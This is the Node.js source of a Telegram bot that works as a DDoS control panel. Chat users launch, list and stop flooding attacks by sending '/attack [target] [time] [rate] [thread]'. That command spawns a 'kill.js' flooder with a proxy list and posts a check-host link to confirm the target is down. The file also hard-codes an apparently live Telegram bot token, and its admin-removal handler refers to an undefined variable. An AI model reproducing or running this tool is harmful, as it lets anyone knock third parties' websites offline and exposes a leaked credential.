const TelegramBot = require('node-telegram-bot-api')
const { spawn } = require('child_process')
const express = require('express')
const si = require('systeminformation')
const fs = require('fs').promises
const path = require('path')

const TOKEN = '7937745403:AAGrQ_OVQalmt2tzz6XJBtDDcD-YN-gATu8'
const bot = new TelegramBot(TOKEN, { polling: true })

const app = express()
const PORT = process.env.PORT || 3000
app.get('/', (req, res) => res.send('https://api-kiendev.up.railway.app'))
app.listen(PORT, () => console.log(`Listening on port ${PORT}`))

const activeAttacks = {}
const GROUP_SETTINGS_PATH = path.join(__dirname, 'assets', 'group_settings.json')
const ADMIN_LIST_PATH = path.join(__dirname, 'assets', 'admin_lists.json')

async function loadJson(filePath) {
  try {
    const data = await fs.readFile(filePath, 'utf8')
    return JSON.parse(data)
  } catch (err) {
    return filePath.includes('admin_lists') ? {} : {}
  }
}

async function saveJson(filePath, data) {
  await fs.writeFile(filePath, JSON.stringify(data, null, 2))
}

bot.onText(/\/system/, async (msg) => {
  const chatId = msg.chat.id
  const admins = await loadJson(ADMIN_LIST_PATH)
  const groupSettings = await loadJson(GROUP_SETTINGS_PATH)
  const isAdmin = Object.keys(admins).includes(String(msg.from.id))
  const isGroupActive = groupSettings[msg.chat.id]?.botStatus === true

  if (!isAdmin && !isGroupActive) return

  try {
    const [cpu, mem, disk, os, network, processes, memLayout] = await Promise.all([
      si.cpu(),
      si.mem(),
      si.fsSize(),
      si.osInfo(),
      si.networkInterfaces(),
      si.processes(),
      si.memLayout()
    ])
    const diskInfo = disk.length > 0 ? disk[0] : { fs: 'N/A', size: 0, used: 0 }
    const networkInfo = network.length > 0 ? network[0] : { iface: 'N/A', ip4: 'N/A' }
    const swapTotal = memLayout.reduce((sum, m) => sum + (m.swapTotal || 0), 0)
    const swapUsed = memLayout.reduce((sum, m) => sum + (m.swapUsed || 0), 0)
    const systemInfo = {
      os: `${os.distro} ${os.release} (${os.arch})`,
      kernel: os.kernel,
      hostname: os.hostname,
      cpu: `${cpu.manufacturer} ${cpu.brand} (${cpu.cores} cores, ${cpu.speed} GHz)`,
      ram: `${(mem.total / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(mem.used / 1024 / 1024 / 1024).toFixed(2)} GB used, ${(mem.free / 1024 / 1024 / 1024).toFixed(2)} GB free`,
      disk: `${diskInfo.fs} ${(diskInfo.size / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(diskInfo.used / 1024 / 1024 / 1024).toFixed(2)} GB used`,
      network: `${networkInfo.iface} (${networkInfo.ip4})`,
      activeProcesses: processes.list.map(p => `${p.name} (PID: ${p.pid})`).join(', ') || 'None',
      swap: `${(swapTotal / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(swapUsed / 1024 / 1024 / 1024).toFixed(2)} GB used`
    }
    bot.sendMessage(chatId, '```json\n' + JSON.stringify(systemInfo, null, 2) + '\n```', { parse_mode: 'Markdown' })
  } catch (err) {
    bot.sendMessage(chatId, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
  }
})

bot.onText(/\/adminlist/, async (msg) => {
  const chatId = msg.chat.id
  const admins = await loadJson(ADMIN_LIST_PATH)
  const isAdmin = Object.keys(admins).includes(String(msg.from.id))
  const groupSettings = await loadJson(GROUP_SETTINGS_PATH)
  const isGroupActive = groupSettings[msg.chat.id]?.botStatus === true

  if (!isAdmin && !isGroupActive) return

  const adminList = Object.entries(admins).map(([id, name]) => ({ id: Number(id), name }))
  bot.sendMessage(chatId, '```json\n' + JSON.stringify({ adminList }, null, 2) + '\n```', { parse_mode: 'Markdown' })
})

bot.onText(/\/bot\s+(on|off)/, async (msg, match) => {
  const chatId = msg.chat.id
  const admins = await loadJson(ADMIN_LIST_PATH)
  const isAdmin = Object.keys(admins).includes(String(msg.from.id))

  if (!isAdmin) {
    bot.sendMessage(chatId, '```json\n' + JSON.stringify({ error: 'Only admins can toggle bot status' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
    return
  }

  const status = match[1] === 'on'
  const groupSettings = await loadJson(GROUP_SETTINGS_PATH)
  groupSettings[chatId] = { botStatus: status }
  await saveJson(GROUP_SETTINGS_PATH, groupSettings)
  bot.sendMessage(chatId, '```json\n' + JSON.stringify({ botStatus: status ? 'Enabled' : 'Disabled', groupId: chatId }, null, 2) + '\n```', { parse_mode: 'Markdown' })
})

bot.on('message', async (msg) => {
  const id = msg.chat.id
  const text = msg.text?.trim()
  const userId = msg.from.id
  const username = msg.from.username || 'depTrai'

  if (!text) return

  const admins = await loadJson(ADMIN_LIST_PATH)
  const groupSettings = await loadJson(GROUP_SETTINGS_PATH)
  const isAdmin = Object.keys(admins).includes(String(userId))
  const isGroupActive = groupSettings[id]?.botStatus === true

  if (!isAdmin && !isGroupActive) return

  if (text.startsWith('/attack')) {
    const args = text.split(/\s+/).slice(1)
    if (args.length !== 4) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: '/attack [target] [time] [rate] [thread]' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }

    const [target, timeStr, rate, thread] = args
    const time = parseInt(timeStr)

    if (!target || isNaN(time) || isNaN(parseInt(rate)) || isNaN(parseInt(thread))) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Invalid arguments' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }

    if (!isAdmin && time > 60) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Attack time must be ≤ 60 seconds for non-admins' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }

    const cmd = spawn('node', ['./kill.js', target, time, rate, thread, './prx.txt'], { stdio: ['ignore', 'pipe', 'pipe'] })
    const attackId = `${userId}_${Date.now()}`
    activeAttacks[attackId] = { cmd, target, time, rate, thread, userId, remainingTime: time, messageId: null, startTime: Date.now() }

    const response = {
      status: 'Attack Started',
      target,
      time,
      rate,
      thread,
      caller: username,
      index: attackId
    }

    const sentMsg = await bot.sendMessage(id, '```json\n' + JSON.stringify(response, null, 2) + '\n```', {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Check Website 🔍',
              url: `https://check-host.net/check-http?host=${target}`
            }
          ]
        ]
      }
    })
    activeAttacks[attackId].messageId = sentMsg.message_id

    const interval = setInterval(async () => {
      if (!activeAttacks[attackId]) {
        clearInterval(interval)
        return
      }
      const elapsed = Math.floor((Date.now() - activeAttacks[attackId].startTime) / 1000)
      activeAttacks[attackId].remainingTime = Math.max(0, time - elapsed)
      if (activeAttacks[attackId].remainingTime <= 0) {
        activeAttacks[attackId].cmd.kill()
        clearInterval(interval)
        return
      }
      const updatedResponse = {
        status: 'Attack Running',
        target,
        time: activeAttacks[attackId].remainingTime,
        rate,
        thread,
        caller: username,
        index: attackId
      }
      try {
        await bot.editMessageText('```json\n' + JSON.stringify(updatedResponse, null, 2) + '\n```', {
          chat_id: id,
          message_id: sentMsg.message_id,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: 'Check Website 🔍',
                  url: `https://check-host.net/check-http?host=${target}`
                }
              ]
            ]
          }
        })
      } catch (err) {
        console.error(`Failed to edit message: ${err.message}`)
      }
    }, 10000)

    cmd.stderr.on('data', (data) => {
      console.error(`kill.js error: ${data}`)
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: `kill.js: ${data}` }, null, 2) + '\n```', { parse_mode: 'Markdown' })
    })

    cmd.on('error', (err) => {
      clearInterval(interval)
      delete activeAttacks[attackId]
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
    })

    cmd.on('close', (code) => {
      clearInterval(interval)
      delete activeAttacks[attackId]
      bot.sendMessage(id, '```json\n' + JSON.stringify({ done: true, code, target }, null, 2) + '\n```', { parse_mode: 'Markdown' })
    })

    setTimeout(() => {
      if (activeAttacks[attackId]) {
        activeAttacks[attackId].cmd.kill()
        clearInterval(interval)
      }
    }, time * 1000)
  }

  if (text === '/list') {
    const list = Object.entries(activeAttacks)
      .filter(([_, v]) => isAdmin || v.userId === userId)
      .map(([key, v]) => ({
        index: key,
        target: v.target,
        time: v.remainingTime,
        rate: v.rate,
        thread: v.thread
      }))
    bot.sendMessage(id, '```json\n' + JSON.stringify(list, null, 2) + '\n```', { parse_mode: 'Markdown' })
  }

  if (text.startsWith('/stop')) {
    const args = text.split(/\s+/).slice(1)
    if (args.length !== 1) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: '/stop <index>' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }
    const key = args[0]
    const attack = activeAttacks[key]
    if (!attack) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Attack not found' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }
    if (!isAdmin && attack.userId !== userId) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Permission denied' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }
    attack.cmd.kill()
    delete activeAttacks[key]
    bot.sendMessage(id, '```json\n' + JSON.stringify({ stopped: true, target: attack.target }, null, 2) + '\n```', { parse_mode: 'Markdown' })
  }

  if (text.startsWith('/add') && msg.reply_to_message) {
    if (!isAdmin) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Only admins can add new admins' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }
    const newAdminId = String(msg.reply_to_message.from.id)
    const newAdminName = msg.reply_to_message.from.first_name + (msg.reply_to_message.from.last_name || '')
    if (admins[newAdminId]) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'User is already an admin' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }
    admins[newAdminId] = newAdminName
    await saveJson(ADMIN_LIST_PATH, admins)
    bot.sendMessage(id, '```json\n' + JSON.stringify({ adminAdd: true, fullName: newAdminName, idNewAdmin: Number(newAdminId) }, null, 2) + '\n```', { parse_mode: 'Markdown' })
  }

  if (text.startsWith('/remove') && msg.reply_to_message) {
    if (!isAdmin) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Only admins can remove admins' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }
    const removeAdminId = String(msg.reply_to_message.from.id)
    const removeAdminName = msg.reply_to_message.from.first_name + (msg.reply_to_message.from.last_name || '')
    if (!admins[removeAdminId]) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'User is not an admin' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }
    delete admins[removeAdminId]
    await saveJson(ADMIN_LIST_PATH, admins)
    bot.sendMessage(id, '```json\n' + JSON.stringify({ adminRemove: true, fullName: beautiful, idRemovedAdmin: Number(removeAdminId) }, null, 2) + '\n```', { parse_mode: 'Markdown' })
  }
})

bot.on('polling_error', (err) => console.error(err.message))
